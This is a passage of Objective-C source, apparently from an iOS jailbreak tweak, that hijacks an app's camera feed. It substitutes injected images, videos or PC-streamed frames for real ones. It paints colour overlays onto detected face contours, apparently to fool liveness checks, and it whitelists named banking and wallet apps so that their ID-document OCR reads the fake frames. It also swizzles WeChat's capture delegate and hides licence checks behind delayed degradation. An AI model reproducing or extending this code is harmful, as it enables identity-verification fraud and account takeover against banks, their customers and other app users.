        img = [img imageByApplyingOrientation:kCGImagePropertyOrientationRight];
    } else if (gVideoRotation == 180) {
        img = [img imageByApplyingOrientation:kCGImagePropertyOrientationDown];
    } else if (gVideoRotation == 270) {
        img = [img imageByApplyingOrientation:kCGImagePropertyOrientationLeft];
    }
    if (gVideoFlipH) {
        CGRect ext = img.extent;
        img = [img imageByApplyingTransform:CGAffineTransformMake(-1, 0, 0, 1, 2 * ext.origin.x + ext.size.width, 0)];
    }
    return img;
}

// Apply three-color injection overlay to CIImage
static CGRect gLastFaceRect = CGRectZero;
static uint64_t gLastFaceTime = 0;
static CGPathRef gLastFaceContourPath = NULL; // cached face contour for mode 0

// Helper: create CGPath mask image from face contour points
static CIImage *vcam_createContourMask(CGPathRef contourPath, CGRect extent) {
    size_t w = (size_t)extent.size.width, h = (size_t)extent.size.height;
    CGColorSpaceRef cs = CGColorSpaceCreateDeviceGray();
    CGContextRef ctx = CGBitmapContextCreate(NULL, w, h, 8, w, cs, kCGImageAlphaNone);
    CGColorSpaceRelease(cs);
    if (!ctx) return nil;
    // Black background
    CGContextSetFillColorWithColor(ctx, [UIColor blackColor].CGColor);
    CGContextFillRect(ctx, CGRectMake(0, 0, w, h));
    // White face contour area
    CGContextSetFillColorWithColor(ctx, [UIColor whiteColor].CGColor);
    CGContextAddPath(ctx, contourPath);
    CGContextFillPath(ctx);
    CGImageRef cgImg = CGBitmapContextCreateImage(ctx);
    CGContextRelease(ctx);
    if (!cgImg) return nil;
    CIImage *mask = [CIImage imageWithCGImage:cgImg];
    CGImageRelease(cgImg);
    return mask;
}

static CIImage *vcam_applyColorInject(CIImage *img) {
    if (!gColorInject || !img) return img;
    if (gInjectR < 0.01 && gInjectG < 0.01 && gInjectB < 0.01) return img;
    CGRect ext = img.extent;

    // Detect face using Vision (throttle to every ~3 frames)
    static int sDetectSkip = 0;
    CGRect faceRect = gLastFaceRect;
    static VNFaceObservation *sLastObs = nil;

    if (sDetectSkip <= 0 || CGRectIsEmpty(faceRect)) {
        @autoreleasepool {
            VNDetectFaceLandmarksRequest *req = [[VNDetectFaceLandmarksRequest alloc] init];
            VNImageRequestHandler *handler = [[VNImageRequestHandler alloc] initWithCIImage:img options:@{}];
            [handler performRequests:@[req] error:nil];
            NSArray<VNFaceObservation *> *results = req.results;

            if (results.count > 0) {
                sLastObs = results[0];
                CGRect bbox = sLastObs.boundingBox; // normalized 0~1, bottom-left origin
                CGFloat imgW = ext.size.width, imgH = ext.size.height;
                // Convert to image pixel coords
                CGFloat bx = bbox.origin.x * imgW, by = bbox.origin.y * imgH;
                CGFloat bw = bbox.size.width * imgW, bh = bbox.size.height * imgH;
                // Apply diameter/offset
                CGFloat cx = bx + bw * 0.5 + gInjectOffX * bw;
                CGFloat cy = by + bh * 0.5 + gInjectOffY * bh;
                CGFloat nw = bw * gInjectDiameter * 2, nh = bh * gInjectDiameter * 2;
                faceRect = CGRectMake(cx - nw * 0.5, cy - nh * 0.5, nw, nh);
                faceRect = CGRectIntersection(faceRect, ext);
                gLastFaceRect = faceRect;
                gLastFaceTime = mach_absolute_time();

                // Build face contour path for mode 0
                if (gInjectMode == 0 && sLastObs.landmarks.faceContour) {
                    VNFaceLandmarkRegion2D *contour = sLastObs.landmarks.faceContour;
                    const CGPoint *pts = [contour pointsInImageOfSize:ext.size];
                    if (contour.pointCount > 2) {
                        CGMutablePathRef path = CGPathCreateMutable();
                        CGFloat bcx = (bbox.origin.x + bbox.size.width * 0.5) * imgW;
                        CGFloat bcy = (bbox.origin.y + bbox.size.height * 0.5) * imgH;
                        for (NSUInteger i = 0; i < contour.pointCount; i++) {
                            CGFloat px = bcx + (pts[i].x - bcx) * gInjectDiameter * 2 + gInjectOffX * bw;
                            CGFloat py = bcy + (pts[i].y - bcy) * gInjectDiameter * 2 + gInjectOffY * bh;
                            if (i == 0) CGPathMoveToPoint(path, NULL, px, py);
                            else CGPathAddLineToPoint(path, NULL, px, py);
                        }
                        CGPathCloseSubpath(path);
                        if (gLastFaceContourPath) CGPathRelease(gLastFaceContourPath);
                        gLastFaceContourPath = path;
                    }
                }
            } else {
                mach_timebase_info_data_t tbi;
                mach_timebase_info(&tbi);
                uint64_t elapsed = (mach_absolute_time() - gLastFaceTime) * tbi.numer / tbi.denom;
                if (elapsed > 500000000ULL) {
                    gLastFaceRect = CGRectZero;
                    return img;
                }
            }
        }
        sDetectSkip = 3;
    } else {
        sDetectSkip--;
    }

    if (CGRectIsEmpty(faceRect)) return img;

    // Create mask based on mode
    CIImage *mask = nil;
    if (gInjectMode == 0 && gLastFaceContourPath) {
        // 人脸形状: use actual face contour path as mask
        mask = vcam_createContourMask(gLastFaceContourPath, ext);
    }
    if (!mask) {
        // 椭圆形状 or fallback: radial gradient
        CGFloat mcx = CGRectGetMidX(faceRect), mcy = CGRectGetMidY(faceRect);
        CGFloat radius = MAX(faceRect.size.width, faceRect.size.height) * 0.5;
        CIFilter *radial = [CIFilter filterWithName:@"CIRadialGradient"];
        [radial setValue:[CIVector vectorWithX:mcx Y:mcy] forKey:@"inputCenter"];
        [radial setValue:@(radius * 0.6) forKey:@"inputRadius0"];
        [radial setValue:@(radius) forKey:@"inputRadius1"];
        [radial setValue:[CIColor colorWithRed:1 green:1 blue:1 alpha:1] forKey:@"inputColor0"];
        [radial setValue:[CIColor colorWithRed:1 green:1 blue:1 alpha:0] forKey:@"inputColor1"];
        mask = [radial.outputImage imageByCroppingToRect:ext];
    }

    // Create color overlay
    CIColor *overlayColor = [CIColor colorWithRed:gInjectR green:gInjectG blue:gInjectB alpha:gInjectAlpha];
    CIImage *colorImg = [[CIImage imageWithColor:overlayColor] imageByCroppingToRect:ext];

    // Apply mask to color overlay: colored only where mask is white (face area)
    CIFilter *blendMask = [CIFilter filterWithName:@"CIBlendWithMask"];
    [blendMask setValue:colorImg forKey:kCIInputImageKey];          // foreground (color)
    [blendMask setValue:img forKey:kCIInputBackgroundImageKey];     // background (original)
    [blendMask setValue:mask forKey:@"inputMaskImage"];             // mask (face region)
    CIImage *result = blendMask.outputImage;
    return result ?: img;
}

static BOOL vcam_replacePixelBuffer(CVPixelBufferRef pixelBuffer) {
    @try {
        if (!gCICtx || !pixelBuffer) return NO;
        // Skip if pixel buffer is locked/busy (another thread is encoding it)
        if (CVPixelBufferGetIOSurface(pixelBuffer) == NULL) {
            // Non-IOSurface buffer: lock to ensure exclusive access
            CVReturn lr = CVPixelBufferLockBaseAddress(pixelBuffer, 0);
            if (lr != kCVReturnSuccess) return NO;
            CVPixelBufferUnlockBaseAddress(pixelBuffer, 0);
        }
        // Delayed degradation: if auth fragments don't agree, count frames
        // After random threshold (200-500 frames ≈ 7-17 seconds at 30fps), stop working
        // This makes it extremely hard for crackers to identify which check they missed
        if (_authScale() != 1.0) {
            if (!_degradeActive) { _degradeActive = YES; _degradeCounter = 0; }
            _degradeCounter++;
            if (_degradeCounter > (int)(200 + (_aS1 & 0xFF))) return NO;
        }
        // Read floating window controls from shared file (written by SpringBoard)
        vcam_readControls();
        size_t w = CVPixelBufferGetWidth(pixelBuffer);
        size_t h = CVPixelBufferGetHeight(pixelBuffer);
        // Skip non-camera buffers (thumbnails, circular video encoding, etc.)
        if (w < 480 || h < 480) return NO;

        // Stream mode: read JPEG from shared file (cross-process)
        // Tolerance: 10s freshness for new loads. If stream goes stale BUT we have a
        // cached frame, keep showing it (avoid the camera flicker / loading spinner
        // when PC has brief hiccups during USB streaming).
        {
            static CIImage *sCachedStreamImg = nil;
            static NSTimeInterval sLastStreamLoad = 0;
            static int sStreamLogCount = 0;
            NSTimeInterval now = CACurrentMediaTime();
            if (now - sLastStreamLoad > 0.03) {
                sLastStreamLoad = now;
                // Freshness check: only LOAD a new image if recently modified
                BOOL fresh = NO;
                NSDictionary *attr = [[NSFileManager defaultManager] attributesOfItemAtPath:VCAM_STREAM_FRAME error:nil];
                if (attr) {
                    NSDate *modDate = attr[NSFileModificationDate];
                    NSTimeInterval age = modDate ? [[NSDate date] timeIntervalSinceDate:modDate] : 999;
                    if (age < 10.0) {
                        fresh = YES;
                    }
                    unsigned long long fsize = [attr[NSFileSize] unsignedLongLongValue];
                    if (sStreamLogCount < 5) {
                        sStreamLogCount++;
                        vcam_log([NSString stringWithFormat:@"STREAM: file exists size=%llu age=%.1fs fresh=%@ pb=%zux%zu",
                            fsize, age, fresh ? @"Y" : @"N", w, h]);
                    }
                }
                if (fresh) {
                    NSData *data = [NSData dataWithContentsOfFile:VCAM_STREAM_FRAME];
                    if (data && data.length > 0) {
                        CGImageSourceRef src = CGImageSourceCreateWithData((__bridge CFDataRef)data, NULL);
                        if (src) {
                            CGImageRef cgImg = CGImageSourceCreateImageAtIndex(src, 0, NULL);
                            CFRelease(src);
                            if (cgImg) {
                                size_t imgW = CGImageGetWidth(cgImg);
                                size_t imgH = CGImageGetHeight(cgImg);
                                CIImage *newImg = [CIImage imageWithCGImage:cgImg];
                                CGImageRelease(cgImg);
                                if (newImg && newImg.extent.size.width > 0 && newImg.extent.size.height > 0) {
                                    if (sStreamLogCount <= 6) {
                                        sStreamLogCount++;
                                        vcam_log([NSString stringWithFormat:@"STREAM: decoded OK %zux%zu ciExt=%.0fx%.0f",
                                            imgW, imgH, newImg.extent.size.width, newImg.extent.size.height]);
                                    }
                                    sCachedStreamImg = newImg;
                                } else {
                                    sCachedStreamImg = nil;
                                }
                            } else {
                                if (sStreamLogCount <= 6) { sStreamLogCount++; vcam_log(@"STREAM: CGImage decode FAILED"); }
                                sCachedStreamImg = nil;
                            }
                        } else {
                            if (sStreamLogCount <= 6) { sStreamLogCount++; vcam_log(@"STREAM: CGImageSource FAILED"); }
                            sCachedStreamImg = nil;
                        }
                    } else {
                        sCachedStreamImg = nil;
                    }
                } else if (!attr) {
                    // File doesn't exist at all → user explicitly stopped stream
                    sCachedStreamImg = nil;
                }
                // If !fresh but attr exists: keep using sCachedStreamImg (last good frame)
                // Don't delete the file — the PC might be reconnecting
            }
            if (sCachedStreamImg) {
                // Stream mode (PC push): use aspectFit so user sees the WHOLE pushed image
                // (e.g. driver's license OCR scenario) — letterbox bars on edges, no zoom crop.
                CIImage *img = vcam_aspectFit(sCachedStreamImg, w, h);
                img = vcam_applyColorInject(img);
                [gCICtx render:img toCVPixelBuffer:pixelBuffer];
                // Force GPU render completion before returning buffer to caller
                CVPixelBufferLockBaseAddress(pixelBuffer, kCVPixelBufferLock_ReadOnly);
                CVPixelBufferUnlockBaseAddress(pixelBuffer, kCVPixelBufferLock_ReadOnly);
                return YES;
            }
        }

        // Image mode: static image takes priority
        if (vcam_imageExists()) {
            CIImage *img = vcam_loadStaticImage();
            if (!img) return NO;
            img = vcam_aspectFill(img, w, h);
            img = vcam_applyColorInject(img);
            [gCICtx render:img toCVPixelBuffer:pixelBuffer];
            CVPixelBufferLockBaseAddress(pixelBuffer, kCVPixelBufferLock_ReadOnly);
            CVPixelBufferUnlockBaseAddress(pixelBuffer, kCVPixelBufferLock_ReadOnly);
            return YES;
        }

        // Video mode (with transform pipeline: pause → rotate → flip → offset crop)
        CIImage *img = nil;
        CMSampleBufferRef frame = nil;
        if (gVideoPaused && gPausedFrame) {
            img = gPausedFrame;
        } else {
            frame = vcam_readFrame(gLockA, &gReaderA, &gOutputA);
            if (!frame) return NO;
            CVImageBufferRef srcPB = CMSampleBufferGetImageBuffer(frame);
            if (!srcPB) { CFRelease(frame); return NO; }
            img = [CIImage imageWithCVImageBuffer:srcPB];
            if (!img) { CFRelease(frame); return NO; }
            // Cache detached copy for pause: immediately if paused, or every ~15 frames
            {
                static int sPauseCounter = 0;
                BOOL shouldCache = gVideoPaused || (++sPauseCounter >= 15);
                if (shouldCache && gCICtx) {
                    sPauseCounter = 0;
                    CGImageRef cg = [gCICtx createCGImage:img fromRect:img.extent];
                    if (cg) {
                        gPausedFrame = [CIImage imageWithCGImage:cg];
                        CGImageRelease(cg);
                    }
                }
            }
        }
        img = vcam_applyVideoTransforms(img);
        img = vcam_aspectFill(img, w, h);
        img = vcam_applyOffset(img, w, h, gVideoOffsetX, gVideoOffsetY);
        img = vcam_applyColorInject(img);
        [gCICtx render:img toCVPixelBuffer:pixelBuffer];
        // Force GPU render completion before returning buffer to caller
        CVPixelBufferLockBaseAddress(pixelBuffer, kCVPixelBufferLock_ReadOnly);
        CVPixelBufferUnlockBaseAddress(pixelBuffer, kCVPixelBufferLock_ReadOnly);
        if (frame) CFRelease(frame);
        return YES;
    } @catch (NSException *e) { return NO; }
}

static BOOL vcam_replaceInPlace(CMSampleBufferRef sampleBuffer) {
    if (!_isAuth()) return NO;
    if (!VCAM_CHK_A()) { _aS1 = 0; _aS2 = 0; _aS3 = 0; _aS4 = 0; return NO; }
    @try {
        CVImageBufferRef pb = CMSampleBufferGetImageBuffer(sampleBuffer);
        return vcam_replacePixelBuffer(pb);
    } @catch (NSException *e) { return NO; }
}

// ============================================================
// Buffer-replacement mode (vcam123-compatible architecture).
// Banking apps' OCR scans the raw pixel buffer at fixed coords; if our
// content sits inside a 1920x1080 letterbox/aspectFill, OCR's region-of-
// interest doesn't line up with where our pixels actually are. vcam123
// hands the delegate a brand-new CMSampleBuffer at the source video's
// native dimensions (e.g. 720x1280) — OCR's coords then map onto our
// content directly. Whitelisted per-app to avoid breaking apps that
// hardcode the camera's advertised dimensions.
// ============================================================

static BOOL vcam_isBufferReplaceWhitelisted(void) {
    static int sCached = -1;
    if (sCached >= 0) return sCached == 1;
    @try {
        NSString *bid = [NSBundle mainBundle].bundleIdentifier ?: @"";
        static NSArray *whitelist = nil;
        static dispatch_once_t once;
        dispatch_once(&once, ^{
            whitelist = @[
                @"jp.co.hyakugo.smaphobanking",
                @"com.bitkeep.os",
                @"com.MinnaNoGinko.bankapp",
            ];
        });
        sCached = [whitelist containsObject:bid] ? 1 : 0;
        if (sCached == 1) vcam_log([NSString stringWithFormat:@"BufReplace: enabled for %@", bid]);
    } @catch (NSException *e) { sCached = 0; }
    return sCached == 1;
}

// Acquire current source CIImage at native resolution. Applies rotate/flip but no scale.
// Caller must CFRelease *outFrameToRelease if non-NULL after rendering.
static CIImage *vcam_acquireSourceImage(CMSampleBufferRef *outFrameToRelease) {
    if (outFrameToRelease) *outFrameToRelease = NULL;
    @try {
        // Stream mode (USB push) — first priority
        NSDictionary *attr = [[NSFileManager defaultManager] attributesOfItemAtPath:VCAM_STREAM_FRAME error:nil];
        if (attr) {
            NSDate *modDate = attr[NSFileModificationDate];
            NSTimeInterval age = modDate ? [[NSDate date] timeIntervalSinceDate:modDate] : 999;
            if (age < 10.0) {
                NSData *data = [NSData dataWithContentsOfFile:VCAM_STREAM_FRAME];
                if (data && data.length > 0) {
                    CGImageSourceRef src = CGImageSourceCreateWithData((__bridge CFDataRef)data, NULL);
                    if (src) {
                        CGImageRef cgImg = CGImageSourceCreateImageAtIndex(src, 0, NULL);
                        CFRelease(src);
                        if (cgImg) {
                            CIImage *img = [CIImage imageWithCGImage:cgImg];
                            CGImageRelease(cgImg);
                            if (img) return img;
                        }
                    }
                }
            }
        }
        // Image mode
        if (vcam_imageExists()) {
            CIImage *img = vcam_loadStaticImage();
            if (img) return img;
        }
        // Video mode
        if (gVideoPaused && gPausedFrame) {
            return vcam_applyVideoTransforms(gPausedFrame);
        }
        CMSampleBufferRef frame = vcam_readFrame(gLockA, &gReaderA, &gOutputA);
        if (!frame) return nil;
        CVImageBufferRef srcPB = CMSampleBufferGetImageBuffer(frame);
        if (!srcPB) { CFRelease(frame); return nil; }
        CIImage *img = [CIImage imageWithCVImageBuffer:srcPB];
        if (!img) { CFRelease(frame); return nil; }
        if (outFrameToRelease) *outFrameToRelease = frame;
        else CFRelease(frame);
        return vcam_applyVideoTransforms(img);
    } @catch (NSException *e) { return nil; }
}

// Render source CIImage into a NEW CVPixelBuffer matching the given dimensions/format.
// Uses aspectFit (preserve aspect ratio, letterbox/pillarbox with black bars)
// so OCR coordinate systems aligned with camera-native dims still hit our content.
// CIContext can render to NV12 (420f/420v) and BGRA reliably with sRGB working space.
// Caller owns the returned buffer (CVPixelBufferRelease).
static CVPixelBufferRef vcam_renderToNewBufferMatching(size_t targetW, size_t targetH, OSType fmt) {
    if (!gCICtx) return NULL;
    @try {
        CMSampleBufferRef frameToRelease = NULL;
        CIImage *srcImg = vcam_acquireSourceImage(&frameToRelease);
        if (!srcImg) return NULL;
        srcImg = vcam_applyColorInject(srcImg);
        // aspectFit into target dims (preserves aspect, adds black bars)
        srcImg = vcam_aspectFit(srcImg, targetW, targetH);
        CGRect ext = srcImg.extent;
        if (ext.origin.x != 0 || ext.origin.y != 0) {
            srcImg = [srcImg imageByApplyingTransform:CGAffineTransformMakeTranslation(-ext.origin.x, -ext.origin.y)];
        }
        // CIContext supports rendering into BGRA, NV12 (420f / 420v), and a few others.
        // For unknown formats, fall back to BGRA (consumers may break but at least we don't crash).
        OSType useFmt = fmt;
        if (useFmt != kCVPixelFormatType_32BGRA &&
            useFmt != kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange &&
            useFmt != kCVPixelFormatType_420YpCbCr8BiPlanarFullRange) {
            useFmt = kCVPixelFormatType_32BGRA;
        }
        NSDictionary *pba = @{
            (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{},
            (NSString *)kCVPixelBufferCGImageCompatibilityKey: @YES,
            (NSString *)kCVPixelBufferCGBitmapContextCompatibilityKey: @YES,
        };
        CVPixelBufferRef newPB = NULL;
        CVReturn r = CVPixelBufferCreate(kCFAllocatorDefault, targetW, targetH, useFmt,
                                          (__bridge CFDictionaryRef)pba, &newPB);
        if (r != kCVReturnSuccess || !newPB) {
            if (frameToRelease) CFRelease(frameToRelease);
            return NULL;
        }
        [gCICtx render:srcImg toCVPixelBuffer:newPB];
        CVPixelBufferLockBaseAddress(newPB, kCVPixelBufferLock_ReadOnly);
        CVPixelBufferUnlockBaseAddress(newPB, kCVPixelBufferLock_ReadOnly);
        if (frameToRelease) CFRelease(frameToRelease);
        return newPB;
    } @catch (NSException *e) { return NULL; }
}

// Build a new CMSampleBuffer with same dims/format as origSb's image buffer.
// Uses aspectFit so OCR's region-of-interest (in camera-native coords) hits our content.
// Returns NULL on failure (caller should fall back to vcam_replaceInPlace).
// On success, caller owns return.
static CMSampleBufferRef vcam_buildReplacementSampleBuffer(CMSampleBufferRef origSb) {
    if (!origSb || !gCICtx) return NULL;
    if (!_isAuth()) return NULL;
    if (!VCAM_CHK_A()) { _aS1 = 0; _aS2 = 0; _aS3 = 0; _aS4 = 0; return NULL; }
    @try {
        vcam_readControls();
        CVImageBufferRef origPB = CMSampleBufferGetImageBuffer(origSb);
        if (!origPB) return NULL;
        size_t targetW = CVPixelBufferGetWidth(origPB);
        size_t targetH = CVPixelBufferGetHeight(origPB);
        OSType fmt = CVPixelBufferGetPixelFormatType(origPB);
        if (targetW < 64 || targetH < 64) return NULL;
        CVPixelBufferRef newPB = vcam_renderToNewBufferMatching(targetW, targetH, fmt);
        if (!newPB) return NULL;
        CMVideoFormatDescriptionRef fd = NULL;
        OSStatus s1 = CMVideoFormatDescriptionCreateForImageBuffer(kCFAllocatorDefault, newPB, &fd);
        if (s1 != noErr || !fd) {
            CVPixelBufferRelease(newPB);
            return NULL;
        }
        CMSampleTimingInfo timing;
        timing.duration = CMSampleBufferGetDuration(origSb);
        timing.presentationTimeStamp = CMSampleBufferGetPresentationTimeStamp(origSb);
        timing.decodeTimeStamp = CMSampleBufferGetDecodeTimeStamp(origSb);
        CMSampleBufferRef newSb = NULL;
        OSStatus s2 = CMSampleBufferCreateForImageBuffer(
            kCFAllocatorDefault, newPB, true, NULL, NULL, fd, &timing, &newSb);
        CFRelease(fd);
        CVPixelBufferRelease(newPB);
        if (s2 != noErr || !newSb) return NULL;
        return newSb;
    } @catch (NSException *e) { return NULL; }
}

// Build a CVPixelBuffer matching an existing buffer's dims/format. Used for photo-capture
// path on whitelisted apps to replace photo internal buffers without changing dimensions.
// Caller owns return (CVPixelBufferRelease).
static CVPixelBufferRef vcam_buildReplacementPixelBufferMatching(CVPixelBufferRef oldPB) {
    if (!gCICtx || !oldPB) return NULL;
    if (!_isAuth()) return NULL;
    if (!VCAM_CHK_A()) { _aS1 = 0; _aS2 = 0; _aS3 = 0; _aS4 = 0; return NULL; }
    @try {
        vcam_readControls();
        size_t targetW = CVPixelBufferGetWidth(oldPB);
        size_t targetH = CVPixelBufferGetHeight(oldPB);
        OSType fmt = CVPixelBufferGetPixelFormatType(oldPB);
        if (targetW < 64 || targetH < 64) return NULL;
        return vcam_renderToNewBufferMatching(targetW, targetH, fmt);
    } @catch (NSException *e) { return NULL; }
}

// Generate JPEG bytes at given target dimensions using aspectFit.
// Used for photo-capture IOSurface path on whitelisted apps so OCR sees
// camera-expected dims with our source content centered (letterbox if needed).
// Returns nil if no source available.
static NSData *vcam_buildReplacementJPEG(size_t targetW, size_t targetH) {
    if (!gCICtx) return nil;
    if (targetW < 64 || targetH < 64) return nil;
    @try {
        CMSampleBufferRef frameToRelease = NULL;
        CIImage *srcImg = vcam_acquireSourceImage(&frameToRelease);
        if (!srcImg) return nil;
        srcImg = vcam_applyColorInject(srcImg);
        srcImg = vcam_aspectFit(srcImg, targetW, targetH);
        CGRect ext = srcImg.extent;
        if (ext.origin.x != 0 || ext.origin.y != 0) {
            srcImg = [srcImg imageByApplyingTransform:CGAffineTransformMakeTranslation(-ext.origin.x, -ext.origin.y)];
        }
        CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
        NSData *jpeg = [gCICtx JPEGRepresentationOfImage:srcImg colorSpace:cs options:@{}];
        CGColorSpaceRelease(cs);
        if (frameToRelease) CFRelease(frameToRelease);
        return jpeg;
    } @catch (NSException *e) { return nil; }
}

static NSData *vcam_currentFrameAsJPEG(void) {
    @try {
        if (!gCICtx) return nil;

        // Stream mode: file is already JPEG. Cache last-good data so brief
        // PC hiccups (USB stall, encoder spike) don't fall back to real camera.
        {
            static NSData *sLastStreamJPEG = nil;
            NSDictionary *attr = [[NSFileManager defaultManager] attributesOfItemAtPath:VCAM_STREAM_FRAME error:nil];
            if (attr) {
                NSDate *modDate = attr[NSFileModificationDate];
                NSTimeInterval age = modDate ? [[NSDate date] timeIntervalSinceDate:modDate] : 999;
                if (age < 10.0) {
                    NSData *data = [NSData dataWithContentsOfFile:VCAM_STREAM_FRAME];
                    if (data && data.length > 0) {
                        sLastStreamJPEG = data;
                        return data;
                    }
                }
                // File present but stale — show last good frame (don't delete)
                if (sLastStreamJPEG) return sLastStreamJPEG;
            } else {
                // File deleted by user (stop) — clear cache, fall through to other modes
                sLastStreamJPEG = nil;
            }
        }

        // Image mode
        if (vcam_imageExists()) {
            CIImage *img = vcam_loadStaticImage();
            if (!img) return nil;
            CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
            NSData *data = [gCICtx JPEGRepresentationOfImage:img colorSpace:cs options:@{}];
            CGColorSpaceRelease(cs);
            return data;
        }

        // Video mode (with transforms, no aspectFill — callers that need specific
        // dimensions like editLatestPhoto/fileDataRep do their own aspectFill)
        CIImage *img = nil;
        CMSampleBufferRef vframe = nil;
        if (gVideoPaused && gPausedFrame) {
            img = gPausedFrame;
        } else {
            vframe = vcam_readFrame(gLockA, &gReaderA, &gOutputA);
            if (!vframe) return nil;
            CVImageBufferRef pxb = CMSampleBufferGetImageBuffer(vframe);
            if (!pxb) { CFRelease(vframe); return nil; }
            img = [CIImage imageWithCVImageBuffer:pxb];
            if (!img) { CFRelease(vframe); return nil; }
        }
        img = vcam_applyVideoTransforms(img);
        CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
        NSData *data = [gCICtx JPEGRepresentationOfImage:img colorSpace:cs options:@{}];
        CGColorSpaceRelease(cs);
        if (vframe) CFRelease(vframe);
        return data;
    } @catch (NSException *e) { return nil; }
}

static CGImageRef vcam_nextCGImage(void) {
    if (!vcam_isEnabled()) return NULL;
    if (!VCAM_CHK_B()) { _aS1 = 0; _aS2 = 0; _aS3 = 0; _aS4 = 0; return NULL; }
    // Auth-dependent: delayed degradation for overlay mode too
    if (_authScale() != 1.0) {
        if (!_degradeActive) { _degradeActive = YES; _degradeCounter = 0; }
        _degradeCounter++;
        if (_degradeCounter > (int)(200 + (_aS1 & 0xFF))) return NULL;
    }
    vcam_readControls(); // Ensure overlay-based processes also poll controls

    static int sNextDiag = 0;
    BOOL diagLog = (sNextDiag < 3);

    // Stream mode: read from shared file. Cache last-good CGImage so brief
    // hiccups don't trigger overlay-hide (which causes camera flicker).
    static CGImageRef sCachedStreamCG = NULL;
    if (vcam_streamFrameExists()) {
        @try {
            NSDictionary *attr = [[NSFileManager defaultManager] attributesOfItemAtPath:VCAM_STREAM_FRAME error:nil];
            NSDate *modDate = attr ? attr[NSFileModificationDate] : nil;
            NSTimeInterval age = modDate ? [[NSDate date] timeIntervalSinceDate:modDate] : 999;
            if (age < 10.0) {
                NSData *data = [NSData dataWithContentsOfFile:VCAM_STREAM_FRAME];
                if (data && data.length > 0) {
                    CGImageSourceRef src = CGImageSourceCreateWithData((__bridge CFDataRef)data, NULL);
                    if (src) {
                        CGImageRef cgImg = CGImageSourceCreateImageAtIndex(src, 0, NULL);
                        CFRelease(src);
                        if (cgImg) {
                            if (sCachedStreamCG) CGImageRelease(sCachedStreamCG);
                            sCachedStreamCG = CGImageRetain(cgImg);
                            return cgImg;
                        }
                    }
                }
            }
            // Read failed or stale — return last good frame instead of NULL
            if (sCachedStreamCG) return CGImageRetain(sCachedStreamCG);
        } @catch (NSException *e) { return NULL; }
    } else if (sCachedStreamCG) {
        // File deleted (user stop) — clear cache and fall through
        CGImageRelease(sCachedStreamCG);
        sCachedStreamCG = NULL;
    }

    // Image mode — use CGImageSource directly (bypass CIContext to avoid GPU contention in Camera app)
    if (vcam_imageExists()) {
        @try {
            if (!gStaticCGImage) {
                NSData *data = [NSData dataWithContentsOfFile:VCAM_IMAGE];
                if (data && data.length > 0) {
                    CGImageSourceRef src = CGImageSourceCreateWithData((__bridge CFDataRef)data, NULL);
                    if (src) {
                        gStaticCGImage = CGImageSourceCreateImageAtIndex(src, 0, NULL);
                        CFRelease(src);
                    }
                }
                if (diagLog) {
                    sNextDiag++;
                    if (gStaticCGImage)
                        vcam_log([NSString stringWithFormat:@"nextCGImage: IMAGE mode CGImage %zux%zu (direct)",
                            CGImageGetWidth(gStaticCGImage), CGImageGetHeight(gStaticCGImage)]);
                    else
                        vcam_log(@"nextCGImage: IMAGE mode CGImage=NULL (decode failed)");
                }
            }
            if (gStaticCGImage) {
                CGImageRetain(gStaticCGImage);
                return gStaticCGImage;
            }
            return NULL;
        } @catch (NSException *e) { return NULL; }
    }

    // Video mode (with transforms)
    CIImage *ci = nil;
    CMSampleBufferRef vbuf = nil;
    if (gVideoPaused && gPausedFrame) {
        ci = gPausedFrame;
    } else {
        vbuf = vcam_readFrame(gLockB, &gReaderB, &gOutputB);
        if (!vbuf) return NULL;
        CVImageBufferRef pxb = CMSampleBufferGetImageBuffer(vbuf);
        if (!pxb) { CFRelease(vbuf); return NULL; }
        ci = [CIImage imageWithCVImageBuffer:pxb];
        if (!ci) { CFRelease(vbuf); return NULL; }
    }
    ci = vcam_applyVideoTransforms(ci);
    CGImageRef result = gCICtx ? [gCICtx createCGImage:ci fromRect:ci.extent] : NULL;
    if (vbuf) CFRelease(vbuf);
    return result;
}

// --- Dynamic delegate hooks ---
typedef void (*OrigCapIMP)(id, SEL, AVCaptureOutput *, CMSampleBufferRef, AVCaptureConnection *);

// ISA-swizzle a specific delegate instance to intercept sample buffer delivery.
// Used when the delegate's class doesn't implement captureOutput:didOutputSampleBuffer:fromConnection:
// (e.g. WeChat's MMContextObject which uses message forwarding).
// Creates a unique subclass per-instance (like KVO) so the original class's forwarding is preserved
// via the superclass chain.
static NSMutableSet *gISASwizzledObjects;

static void vcam_isaSwizzleDelegate(id delegate) {
    @try {
        if (!delegate) return;
        static dispatch_once_t once;
        dispatch_once(&once, ^{ gISASwizzledObjects = [NSMutableSet new]; });

        // Don't swizzle the same object twice
        NSValue *ptr = [NSValue valueWithPointer:(__bridge void *)delegate];
        @synchronized(gISASwizzledObjects) {
            if ([gISASwizzledObjects containsObject:ptr]) return;
        }

        Class origClass = object_getClass(delegate);
        NSString *origName = NSStringFromClass(origClass);

        // Check if already a vcam_ subclass
        if ([origName hasPrefix:@"vcam_"]) return;

        // Create unique subclass name
        NSString *subName = [NSString stringWithFormat:@"vcam_%@_%p", origName, delegate];
        Class subClass = objc_getClass(subName.UTF8String);
        if (!subClass) {
            subClass = objc_allocateClassPair(origClass, subName.UTF8String, 0);
            if (!subClass) {
                vcam_log([NSString stringWithFormat:@"ISA swizzle: failed to create subclass for %@", origName]);
                return;
            }

            // Add captureOutput:didOutputSampleBuffer:fromConnection: to the subclass
            SEL sel = @selector(captureOutput:didOutputSampleBuffer:fromConnection:);
            __block int logCount = 0;
            NSString *capCN = origName;
            Class parentClass = origClass;

            IMP newIMP = imp_implementationWithBlock(
                ^(id _s, AVCaptureOutput *o, CMSampleBufferRef sb, AVCaptureConnection *c) {
                    @try {
                        if (logCount < 5) {
                            logCount++;
                            vcam_log([NSString stringWithFormat:@"ISAHook %@: enabled=%@",
                                capCN, vcam_isEnabled() ? @"Y" : @"N"]);
                        }
                        CMSampleBufferRef sbToForward = sb;
                        BOOL builtNew = NO;
                        if (vcam_isEnabled() && sb) {
                            if (vcam_isBufferReplaceWhitelisted()) {
                                CMSampleBufferRef nsb = NULL;
                                BOOL ptTried = NO;
                                // Video mode: passthrough source directly (vcam123-style).
                                // Stream/image mode: render via CIContext.
                                if (!vcam_streamFrameExists() && !vcam_imageExists() && vcam_videoExists()) {
                                    nsb = vcam_buildPassthroughSampleBuffer(sb);
